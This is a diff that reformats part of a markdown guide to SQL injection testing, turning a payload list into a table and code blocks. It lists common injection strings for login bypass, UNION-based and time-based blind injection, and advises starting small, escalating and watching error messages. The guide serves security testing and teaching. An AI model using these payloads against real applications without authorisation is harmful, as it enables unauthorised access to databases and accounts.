@@ -21,26 +21,31 @@ URL parameters (GET requests)
 Cookies or HTTP headers (advanced)
 
 🧪 Common Payloads to Try:
-Payload	Purpose
-' OR '1'='1	Bypass login or cause always true condition
-admin' --	Comment out rest of query
-admin' #	Alternative comment style
-' UNION SELECT NULL, NULL--	Test for UNION-based injection
-' OR 1=1 LIMIT 1 OFFSET 1--	Pagination-based injection
-1' AND SLEEP(5)--	Time-based blind SQLi
 
-Start small:
+## 🧪 Common Payloads to Try
 
-sql
-Copy
-Edit
+| Payload                        | Purpose                                |
+|-------------------------------|----------------------------------------|
+| `' OR '1'='1`                 | Bypass login or cause always true condition |
+| `admin' --`                   | Comment out rest of query              |
+| `admin' #`                    | Alternative comment style              |
+| `' UNION SELECT NULL, NULL--` | Test for UNION-based injection         |
+| `' OR 1=1 LIMIT 1 OFFSET 1--` | Pagination-based injection             |
+| `1' AND SLEEP(5)--`           | Time-based blind SQLi                  |
+
+---
+
+### ✅ Start small:
+
+```sql
 ' -- 
+
 Then escalate:
 
-sql
-Copy
-Edit
-' OR '1'='1' -- 
+```sql
+' OR '1'='1' --
+
+ 
 Observe application responses:
 
 Error messages (e.g., SQL syntax error)
